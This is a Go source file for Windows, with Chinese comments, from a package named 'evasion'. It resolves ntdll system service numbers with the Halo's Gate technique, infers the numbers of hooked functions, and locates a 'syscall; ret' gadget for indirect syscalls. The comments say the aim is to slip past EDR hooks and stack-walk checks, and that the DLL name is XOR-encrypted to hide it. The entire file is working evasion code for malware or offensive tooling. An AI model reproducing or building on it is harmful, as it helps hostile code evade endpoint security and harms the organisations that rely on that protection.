//go:build windows

package evasion

import (
	"sort"
	"strings"
	"unsafe"
)

// SSNMap 存储NT函数名到系统服务号的映射
// 初始化后全局可用，所有直接syscall通过此表获取SSN
var SSNMap map[string]uint32

// ntFuncInfo 导出函数信息
type ntFuncInfo struct {
	name string
	addr uintptr
	ssn  uint32
}

// getNtdllBaseFromPEB 获取ntdll基地址
// 方案1: 通过LazyDLL获取（名称已XOR加密，不会暴露字符串）
// 方案2: PEB遍历（需要段寄存器读取，Go无法直接做，暂不使用）
func getNtdllBaseFromPEB() uintptr {
	dll := syscallNewLazyDLL(xorDec(encNtDll, xk))
	return uintptr(dll.Handle())
}

// parseNtExports 解析ntdll导出表，提取所有Nt/Zw函数及其地址
func parseNtExports(base uintptr) []ntFuncInfo {
	if base == 0 {
		return nil
	}

	// MZ签名
	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D {
		return nil
	}

	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	if *(*uint32)(unsafe.Pointer(base + uintptr(eLfanew))) != 0x4550 {
		return nil
	}

	// Export Directory RVA (amd64 OptionalHeader偏移: e_lfanew+0x18, DataDirs: +0x70)
	exportDirRVA := *(*uint32)(unsafe.Pointer(base + uintptr(eLfanew) + 0x18 + 0x70))
	exportDirSize := *(*uint32)(unsafe.Pointer(base + uintptr(eLfanew) + 0x18 + 0x70 + 4))

	if exportDirRVA == 0 || exportDirSize == 0 {
		return nil
	}

	exportDir := base + uintptr(exportDirRVA)
	// IMAGE_EXPORT_DIRECTORY
	// 0x14 NumberOfFunctions
	// 0x18 NumberOfNames
	// 0x1C AddressOfFunctions
	// 0x20 AddressOfNames
	// 0x24 AddressOfNameOrdinals
	numNames := *(*uint32)(unsafe.Pointer(exportDir + 0x18))
	addrOfFunctions := *(*uint32)(unsafe.Pointer(exportDir + 0x1C))
	addrOfNames := *(*uint32)(unsafe.Pointer(exportDir + 0x20))
	addrOfOrdinals := *(*uint32)(unsafe.Pointer(exportDir + 0x24))

	funcNamesBase := base + uintptr(addrOfNames)
	funcAddrsBase := base + uintptr(addrOfFunctions)
	ordinalsBase := base + uintptr(addrOfOrdinals)

	var funcs []ntFuncInfo

	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(funcNamesBase + uintptr(i*4)))
		if nameRVA == 0 || nameRVA > 0x2000000 {
			continue
		}
		name := cStringToGo(base + uintptr(nameRVA))

		if !strings.HasPrefix(name, "Nt") && !strings.HasPrefix(name, "Zw") {
			continue
		}

		ordinal := *(*uint16)(unsafe.Pointer(ordinalsBase + uintptr(i*2)))
		funcAddrRVA := *(*uint32)(unsafe.Pointer(funcAddrsBase + uintptr(ordinal)*4))

		// 转发导出跳过
		if funcAddrRVA >= exportDirRVA && funcAddrRVA < exportDirRVA+exportDirSize {
			continue
		}

		funcs = append(funcs, ntFuncInfo{
			name: name,
			addr: base + uintptr(funcAddrRVA),
		})
	}

	// 按地址排序 — SSN与地址递增顺序严格对应
	sort.Slice(funcs, func(i, j int) bool {
		return funcs[i].addr < funcs[j].addr
	})

	return funcs
}

// cStringToGo C字符串 → Go string
func cStringToGo(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	b := unsafe.Slice((*byte)(unsafe.Pointer(ptr)), 256)
	out := make([]byte, 0, 64)
	for _, c := range b {
		if c == 0 {
			break
		}
		out = append(out, c)
	}
	return string(out)
}

// extractSSN 从ntdll函数stub提取SSN
// 标准stub: mov r10,rcx (4C 8B D1); mov eax,<SSN> (B8 XX XX XX XX); test byte ptr [rcx+0x5ah],1 (F6 C1 5A 01)
func extractSSN(addr uintptr) uint32 {
	// 检查 mov r10, rcx
	if *(*byte)(unsafe.Pointer(addr)) != 0x4C ||
		*(*byte)(unsafe.Pointer(addr + 1)) != 0x8B ||
		*(*byte)(unsafe.Pointer(addr + 2)) != 0xD1 {
		return 0
	}
	// 检查 mov eax, SSN
	if *(*byte)(unsafe.Pointer(addr + 3)) != 0xB8 {
		return 0
	}
	return *(*uint32)(unsafe.Pointer(addr + 4))
}

// isHooked 检查ntdll函数是否被EDR hook
// Hook标志: jmp (E9) 或 jmp [abs] (FF 25)
func isHooked(addr uintptr) bool {
	first := *(*byte)(unsafe.Pointer(addr))
	return first == 0xE9 || (first == 0xFF && *(*byte)(unsafe.Pointer(addr + 1)) == 0x25)
}

// resolveSSNs Halo's Gate: 解析所有NT函数SSN
// 原理: SSN按地址递增排列，已知一个clean函数的SSN即可推断所有hooked函数
func resolveSSNs() map[string]uint32 {
	base := getNtdllBaseFromPEB()
	if base == 0 {
		return nil
	}

	funcs := parseNtExports(base)
	if len(funcs) == 0 {
		return nil
	}

	ssns := make(map[string]uint32)

	// 找基准: 第一个clean函数
	baseIdx := -1
	baseSSN := uint32(0)

	for i, fn := range funcs {
		if !isHooked(fn.addr) {
			ssn := extractSSN(fn.addr)
			if ssn != 0 {
				baseIdx = i
				baseSSN = ssn
				ssns[fn.name] = ssn
				break
			}
		}
	}

	if baseIdx < 0 {
		return nil
	}

	// 推断所有函数SSN
	for i, fn := range funcs {
		if !isHooked(fn.addr) {
			ssn := extractSSN(fn.addr)
			if ssn != 0 {
				ssns[fn.name] = ssn
				continue
			}
		}
		// Hooked函数: SSN = baseSSN + (index - baseIdx)
		ssns[fn.name] = baseSSN + uint32(i-baseIdx)
	}

	return ssns
}

// InitSSNMap 初始化SSN映射 — 在main.go启动时调用
func InitSSNMap() {
	SSNMap = resolveSSNs()
}

// GetSSN 获取指定NT函数的SSN
func GetSSN(name string) uint32 {
	if SSNMap == nil {
		InitSSNMap()
	}
	if ssn, ok := SSNMap[name]; ok {
		return ssn
	}
	return 0
}

// ntdllGadget 存储ntdll.dll中 syscall; ret 指令对的地址
// 间接syscall时，汇编stub通过CALL跳转到此地址执行syscall
// 使EDR栈回溯看到的syscall调用点在ntdll地址空间内
var ntdllGadget uintptr

// findSyscallRetGadget 在ntdll的.text段中搜索 syscall; ret (0x0F 0x05 0xC3) 指令对
// 返回找到的第一个gadget地址，失败返回0（回退到直接syscall）
func findSyscallRetGadget(base uintptr) uintptr {
	if base == 0 {
		return 0
	}

	// MZ签名
	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D {
		return 0
	}

	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	ntHeader := base + uintptr(eLfanew)

	// PE签名
	if *(*uint32)(unsafe.Pointer(ntHeader)) != 0x4550 {
		return 0
	}

	// PE32+ OptionalHeader: FileHeader(20) + OptionalHeader
	// NumberOfSections 在 FileHeader+2 (WORD)
	numSections := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 2))

	// SizeOfOptionalHeader 在 FileHeader+16 (WORD)
	sizeOfOpt := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 16))

	// 第一个SectionHeader在 OptionalHeader 之后
	// ntHeader = PE签名(4) + FileHeader(20) + OptionalHeader(sizeOfOpt)
	sectionBase := ntHeader + 4 + 20 + uintptr(sizeOfOpt)

	for i := uint16(0); i < numSections; i++ {
		sec := sectionBase + uintptr(i)*40 // IMAGE_SECTION_HEADER = 40 bytes

		// 检查段名是否为 .text (0x747865742E = ".text" 小端后6字节)
		namePtr := (*[8]byte)(unsafe.Pointer(sec))
		if namePtr[0] == '.' && namePtr[1] == 't' && namePtr[2] == 'e' && namePtr[3] == 'x' && namePtr[4] == 't' {
			// VirtualAddress(sec+12) DWORD, VirtualSize(sec+8) DWORD
			va := *(*uint32)(unsafe.Pointer(sec + 12))
			vs := *(*uint32)(unsafe.Pointer(sec + 8))
			start := base + uintptr(va)
			end := start + uintptr(vs)

			// 扫描 syscall; ret: 0x0F 0x05 0xC3
			for addr := start; addr < end-2; addr++ {
				b := (*[3]byte)(unsafe.Pointer(addr))
				if b[0] == 0x0F && b[1] == 0x05 && b[2] == 0xC3 {
					return addr
				}
			}
			return 0
		}
	}
	return 0
}

// InitIndirectSyscall 初始化间接syscall所需gadget地址
// 在main.go启动时调用，必须在InitSSNMap之后
func InitIndirectSyscall() {
	base := getNtdllBaseFromPEB()
	ntdllGadget = findSyscallRetGadget(base)
}
